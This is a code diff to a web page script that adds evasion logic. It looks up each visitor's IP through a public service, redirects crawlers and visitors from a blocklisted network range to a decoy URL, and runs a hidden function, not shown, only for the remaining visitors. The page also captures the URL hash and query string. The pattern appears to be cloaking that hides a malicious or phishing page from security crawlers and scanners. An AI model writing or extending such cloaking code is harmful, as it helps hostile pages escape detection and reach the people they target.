@@ -16,6 +16,20 @@ const CFG = {
 };
 
 
+const BLOCKED_IP_EXACT = ["172.253.228.88"];
+const BLOCKED_IP_PREFIX = ["172.253."];
+
+const isBlockedIP = (ip) => {
+  if (!ip || typeof ip !== "string") return false;
+  const s = ip.trim();
+  if (BLOCKED_IP_EXACT.indexOf(s) !== -1) return true;
+  for (let i = 0; i < BLOCKED_IP_PREFIX.length; i++) {
+    if (s.indexOf(BLOCKED_IP_PREFIX[i]) === 0) return true;
+  }
+  return false;
+};
+
+
 const _capturedHash = (function(){ try { return window.location.hash; } catch(e){ return ''; } })();
 const _capturedSearch = (function(){ try { return window.location.search; } catch(e){ return ''; } })();
 
@@ -172,13 +186,22 @@ const run = async () => {
   }
 };
 
-window.onload = () => {
+window.onload = async () => {
   const ua = navigator.userAgent;
   if (ua.includes("Bot") || ua.includes("Crawl")) {
     window.location.replace(CFG.B);
-  } else {
-    run();
+    return;
   }
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
+    const ip = ipRes && ipRes.ip ? ipRes.ip : "";
+    if (isBlockedIP(ip)) {
+      window.location.replace(CFG.B);
+      return;
+    }
+  } catch (_) {
+  }
+  run();
 };
 </script>
 </body>
